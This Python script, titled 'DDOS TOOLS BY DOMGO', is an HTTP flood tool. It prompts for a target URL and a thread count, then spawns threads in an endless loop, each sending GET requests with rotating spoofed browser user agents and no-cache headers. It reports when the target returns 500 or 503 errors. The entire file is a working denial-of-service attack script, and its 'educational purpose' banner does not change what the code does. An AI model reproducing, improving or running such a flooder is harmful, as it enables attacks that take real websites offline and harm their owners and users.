from http.client import HTTPException, HTTPResponse
from subprocess import run
from types import BuiltinMethodType
from requests.models import HTTPError
import requests
import urllib.request
import threading
import random
import time
agentheaders = []
referweb = []
## Botnet 

def agent_list():
    global agentheaders
    agentheaders.append("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Mobile Safari/537.36")
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    agentheaders.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    agentheaders.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    agentheaders.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    agentheaders.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    agentheaders.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    agentheaders.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    agentheaders.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    agentheaders.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return agentheaders


def ranstring(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)


print("=============================")
print("||                         ||")
print("||   DDOS TOOLS BY DOMGO   ||")
print("|| USE IT AT YOUR OWN RISK ||")
print("|| FOR EDUCATIONAL PURPOSE ||")
print("||   Loaded Botnet : 20    ||")
print("||                         ||")
print("=============================")
#input website
while True: #inputting url
	url = input("\nEnter website : \nExample   : https://example.com\nExample 2 : https://example.com/ex\nweb : ")
	try:
		url = str(url)
		break
	except ValueError as e:
		print("Please input valid url!")
		continue
	except EOFError as e:
		print("Please input valid url!")
		continue
#input threads
print("\n\n")
while True:
	threads = input("How many threads you want to use?  \n: ")
	try:
		threads = int(threads)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue
#input delay bot
while True:
	sleepbot = input("How long you the want delay between bot? \n: ")
	try:
		sleepbot = int(sleepbot)
		break
	except ValueError as e:
		print("Please input valid number!")
	continue
#input method
while True:
	method = str.lower(input("Method :\n( GET, HEAD)\n: "))
	try:
		method =str(method)
		break
	except ValueError as e:
		print("Please input valid method")
		continue
#start
agreement = str(input("START ATTACK? y/n \n: "))
#method GET

#method HEAD

if method == "get" or "GET":
	if agreement == "y":
		def GET():
			agent_list()
			try:
				reqattackget = urllib.request.Request(url, method="GET")
				reqattackget.add_header('User-Agent', random.choice(agentheaders))
				reqattackget.add_header('Cache-Control', 'no-cache')
				reqattackget.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
				reqattackget.add_header('Keep-Alive', random.randint(113,127))
				reqattackget.add_header('Connection', 'keep-alive')
				attack = urllib.request.urlopen(reqattackget)
				print('[===GET Request sended ===]')
				pass
			except urllib.error.URLError as b:
				if b.code == 500:
					print("[===Website down : Method GET===]")
				elif b.code == 503:
					print("[===Website down : Method GET===]")
				else:
					print("[===Unknown error===]")
			except Exception as d:
				print(d)
		while True:
			for i in range(threads):
				trget = threading.Thread(target=GET)
				trget.start()
				time.sleep(sleepbot)
	else:
		quit()
else:
	quit()
